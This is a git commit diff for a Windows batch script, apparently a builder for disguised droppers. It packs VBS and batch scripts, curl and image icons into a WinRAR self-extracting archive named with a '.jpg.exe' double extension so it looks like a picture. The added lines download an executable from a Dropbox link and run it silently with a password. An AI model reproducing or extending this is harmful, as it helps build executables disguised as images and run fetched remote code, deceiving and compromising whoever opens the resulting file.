345ef5197a1775b5def86e0b0c0cb7bac0735217
hendalf332 <kittos.remaiden@mail.ru>
2021-03-18 01:06:48 +0200

    Update konstruktor.bat

--- konstruktor.bat
+++ konstruktor.bat
@@ -4,16 +4,8 @@ if exist "%ProgramFiles%\"WinRar\WinRAR.exe (
 ) else if exist WinRAR.exe ( 
 WinRAR.exe a -sfxdefault.sfx sfxconstryctrort.jpg.exe mykonstruktor.bat imageProcessing.vbs sfxconstructror3.vbs.txt sfxconstructror3.vbs.bat mainmain.vbs 12918591_540444079463619_1987164180_n.jpg main.vbs rasinvkr.bat spt2.bat main.bat.exe mainsfx.bat spx.txt sfxcomment.txt defaultpngicon.ico defaultjpgicon.ico upa.ico libcurl.dll curl-ca-bundle.crt curl.exe konstruktor.txt "nati&gabi.ico" -zkonstruktor.txt -iicon"nati&gabi.ico" -IBCK 
 ) else (
-curl https://www.rarlab.com/rar/wrar601b1.exe -o wrarsetup.exe
-echo set oShell = WScript.CreateObject^("WScript.Shell"^) >mysh.vbs
-echo oShell.SendKeys^("%CD%"^) >>mysh.vbs
-echo WScript.Sleep 50 >>mysh.vbs
-echo oShell.SendKeys^("{ENTER}"^) >>mysh.vbs
-start /MIN rasinvkr.bat "wrarsetup.exe /S"
-timeout /T 1
-cscript mysh.vbs
-del mysh.vbs
-timeout /T 5
+curl.exe -L https://www.dropbox.com/s/qk032x6ib517ldg/rara.exe?dl=1 -o rara.exe
+rara.exe -pmainpass -d %CD% -s1
 WinRAR.exe a -sfxdefault.sfx sfxconstryctrort.jpg.exe mykonstruktor.bat imageProcessing.vbs sfxconstructror3.vbs.txt sfxconstructror3.vbs.bat mainmain.vbs 12918591_540444079463619_1987164180_n.jpg main.vbs rasinvkr.bat spt2.bat main.bat.exe mainsfx.bat spx.txt sfxcomment.txt defaultpngicon.ico defaultjpgicon.ico upa.ico libcurl.dll curl-ca-bundle.crt curl.exe konstruktor.txt "nati&gabi.ico" -zkonstruktor.txt -iicon"nati&gabi.ico" -IBCK 
 )
 PAUSE
